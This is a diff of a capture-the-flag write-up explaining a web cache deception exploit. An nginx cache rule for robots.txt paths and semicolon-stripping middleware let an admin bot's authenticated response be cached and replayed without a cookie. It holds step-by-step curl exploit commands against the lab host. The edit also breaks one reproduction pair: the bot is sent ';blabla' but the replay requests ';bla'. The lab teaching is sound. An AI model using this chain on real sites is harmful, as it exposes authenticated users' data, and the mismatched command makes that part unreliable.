@@ -189,7 +189,7 @@ I verified that this is a `403` and not a `404`, on purpose, I want players to s
 
 So the only way to read this route is to make the **bot** request it.
 
-## Layer 3 - The cache rule that only likes robots.txt
+## Layer 3: The cache rule that only likes robots.txt
 
 This is the heart of the challenge. Here is the relevant `nginx/default.conf`:
 
@@ -237,17 +237,17 @@ server {
 
 Read five things in that block:
 
-1. **`location ~* /robots\.txt$`** — a regex location, so it only catches URIs whose **last path segment is `robots.txt`**. Everything else falls into `location /`, which is **not cached at all**.
-2. **`proxy_cache_key "$request_method$request_uri"`** — the key is built from the **original request URI**. Nginx preserves the semicolon form in `$request_uri`; it does not apply the application’s later route rewrite there.
-3. **No host in the key** — this is what the "omitting Host" comment is really about. The bot reaches nginx as `BOT_URL: http://nginx:8080` (so `Host: nginx`), while you reach it as `http://ironveil:8080` (so `Host: ironveil`). Because the key is only *method + URI*, the bot's fill and your replay land on **the same key** despite the different `Host` headers. If the key had included `$host`, the whole chain would not work.
-4. **`proxy_cache_valid 200 10s`** — only `200`s are stored, and only for **10 seconds**. I want a tight window so the game is not solved by a lucky stale hit.
-5. **`proxy_ignore_headers Cache-Control Expires Set-Cookie Vary`** — the app's own headers are not allowed to opt out of caching.
+1. **`location ~* /robots\.txt$`**: a regex location, so it only catches URIs whose **last path segment is `robots.txt`**. Everything else falls into `location /`, which is **not cached at all**.
+2. **`proxy_cache_key "$request_method$request_uri"`**: the key is built from the **original request URI**. Nginx preserves the semicolon form in `$request_uri`; it doesn't apply the application’s later route rewrite there.
+3. **No host in the key**: this is what the "omitting Host" comment is really about. The bot reaches nginx as `BOT_URL: http://nginx:8080` (so `Host: nginx`), while you reach it as `http://ironveil:8080` (so `Host: ironveil`). Because the key is only *method + URI*, the bot's fill and your replay land on **the same key** despite the different `Host` headers. If the key had included `$host`, the whole chain would not work.
+4. **`proxy_cache_valid 200 10s`**: only `200`s are stored, and only for **10 seconds**. I want a tight window so the game is not solved by a lucky stale hit.
+5. **`proxy_ignore_headers Cache-Control Expires Set-Cookie Vary`**: the app's own headers are not allowed to opt out of caching.
 
-**What does this mean?** If I can get an admin-authenticated `200` into this cache under a URI I know, the cache will serve that body to **anyone** who requests the same URI. No cookie. No admin. The cache does not re-check authorization, and it cannot — it is a dumb key/value store in front of the app.
+**What does this mean?** If I can get an admin-authenticated `200` into this cache under a URI I know, the cache will serve that body to **anyone** who requests the same URI. No cookie. No admin. The cache doesn't re-check authorization, and it can't, it is a dumb key/value store in front of the app.
 
-## Layer 4 - The legacy router eats my semicolons
+## Layer 4: The legacy router eats the semicolons
 
-One more detail that makes the chain reliable. `express.static` is registered **before** the router, so it sees the raw URI with the semicolon still attached, fails to find a file, and hands off. The strip happens in *my* middleware, not in Express's static layer — so the file server never gets a chance to normalize anything.
+One more detail that makes the chain reliable. `express.static` is registered **before** the router, so it sees the raw URI with the semicolon still attached, fails to find a file, and hands off. The strip happens in my middleware, not in Express's static layer so the file server never gets a chance to normalize anything.
 
 ```javascript
 // server.js
@@ -272,10 +272,10 @@ router.use((req, res, next) => {
 router.use('/admin', adminRoutes);
 ```
 
-**What is a "segment parameter"?** Old servlet-style URLs and URI segment parameters let you attach parameters to a *path segment* using a semicolon. In this challenge, Nginx preserves those bytes and the custom application middleware removes them:
+**What is a segment parameter?** Old servlet-style URLs and URI segment parameters let you attach parameters to a path segment using a semicolon. In this challenge, Nginx preserves those bytes and the custom application middleware removes them:
 
 ```text
-/admin/debug-token;solver-123/robots.txt
+/admin/debug-token;blabla/robots.txt
         ^^^^^^^^^^^^^^ this is a matrix parameter on the "debug-token" segment
 ```
 
@@ -298,7 +298,7 @@ Neither half is a bug on its own. The exploit is the **intersection**.
 
 # The Exploit, Step by Step
 
-## Step 1 - Confirm the cache is even there
+## Step 1: Confirm the cache is even there
 
 Do the boring thing first. Warm the one path you know is public:
 
@@ -314,7 +314,7 @@ X-Cache: HIT
 
 I expose `X-Cache` on purpose. In the real world this header is often your fastest way to tell whether a cache is standing between you and the origin, and I wanted players to build the habit of reading it.
 
-## Step 2 - Confirm the admin route exists and refuses you
+## Step 2: Confirm the admin route exists and refuses you
 
 ```bash
 curl -i http://HOST:8080/admin/debug-token
@@ -334,41 +334,33 @@ curl -i http://HOST:8080/admin/debug-token/robots.txt
 {"error":"admin session required"}
 ```
 
-Still `403` — which tells you the `(\/.*)?` group is doing its job, and that the suffix is reaching the handler. **And note that the suffix itself is already cacheable**, because the URI ends in `robots.txt`. Hold that thought, I come back to it.
+Still `403` which tells you the `(\/.*)?` group is doing its job, and that the suffix is reaching the handler. **And note that the suffix itself is already cacheable**, because the URI ends in `robots.txt`. Hold that thought, I come back to it.
 
-## Step 3 - Ask the bot to walk the matrix path
+## Step 3: Ask the bot to walk the matrix path
 
 ```bash
 curl -X POST http://HOST:8080/report \
   -H 'Content-Type: application/json' \
-  -d '{"url":"/admin/debug-token;solver-1699/robots.txt"}'
+  -d '{"url":"/admin/debug-token;blabla/robots.txt"}'
 ```
 
 ```json
 {"status":200,"cache":"MISS"}
 ```
 
-**`status: 200`.** The bot walked in with the admin cookie and the origin answered the admin handler. Note `cache: MISS` — the bot's request **filled** the cache.
+**`status: 200`.** The bot walked in with the admin cookie and the origin answered the admin handler. Note `cache: MISS` the bot's request **filled** the cache.
 
-The response *had* to be a `200` for the fill to happen at all, because `proxy_cache_valid 200 10s` only stores `200`s. That is why the auth check can never be bypassed by "just caching the 403" — the whole chain depends on the bot **succeeding**.
+The response had to be a `200` for the fill to happen at all, because `proxy_cache_valid 200 10s` only stores `200`s. That is why the auth check can never be bypassed by "just caching the 403" the whole chain depends on the bot **succeeding**.
 
-**What does `cache: MISS` actually tell you?** It is confirmation that your URI is cacheable *and* that nobody had warmed that exact key yet. If you saw `HIT` on the bot's request, your key was already filled and you would want a fresh suffix.
+**What does `cache: MISS` actually tell you?** It is confirmation that your URI is cacheable and that nobody had warmed that exact key yet. If you saw `HIT` on the bot's request, your key was already filled and you would want a fresh suffix.
 
-## Step 4 - Replay the exact same URI, no cookie
+## Step 4: Replay the exact same URI, no cookie
 
-![The bot MISS fills the cache, our cookie-less GET turns into a HIT](images/07-cache-hit.png)
+<img width="1251" height="431" alt="image" src="https://github.com/user-attachments/assets/3db148ad-14db-42a8-b4e2-f5629ead2d18" />
 
-```bash
-curl -i 'http://HOST:8080/admin/debug-token;solver-1699/robots.txt'
-```
+Then access the path of the token:
+<img width="1251" height="257" alt="image" src="https://github.com/user-attachments/assets/3f297ef9-7bae-4a6d-b0a0-6cdf337c3210" />
 
-```http
-HTTP/1.1 200 OK
-X-Cache: HIT
-Content-Type: application/json; charset=utf-8
-
-{"debug_token":"BETA-7365042F"}
-```
 
 **What does this mean?**
 
@@ -403,13 +395,13 @@ The `(\/.*)?` optional group in `/^\/debug-token(\/.*)?$/` means **`/admin/debug
 ```bash
 # A) the intended matrix-parameter path
 curl -s -X POST http://HOST:8080/report -H 'Content-Type: application/json' \
-  -d '{"url":"/admin/debug-token;solver-1699/robots.txt"}'
-curl -si 'http://HOST:8080/admin/debug-token;solver-1699/robots.txt' | grep -iE 'x-cache|debug_token'
+  -d '{"url":"/admin/debug-token;blabla/robots.txt"}'
+curl -si 'http://HOST:8080/admin/debug-token;bla/robots.txt' | grep -iE 'x-cache|debug_token'
 
 # B) the plain suffix path, no semicolon
 curl -s -X POST http://HOST:8080/report -H 'Content-Type: application/json' \
-  -d '{"url":"/admin/debug-token/plain-1699/robots.txt"}'
-curl -si 'http://HOST:8080/admin/debug-token/plain-1699/robots.txt' | grep -iE 'x-cache|debug_token'
+  -d '{"url":"/admin/debug-token/blabla/robots.txt"}'
+curl -si 'http://HOST:8080/admin/debug-token/blabla/robots.txt' | grep -iE 'x-cache|debug_token'
 ```
 
 ```http
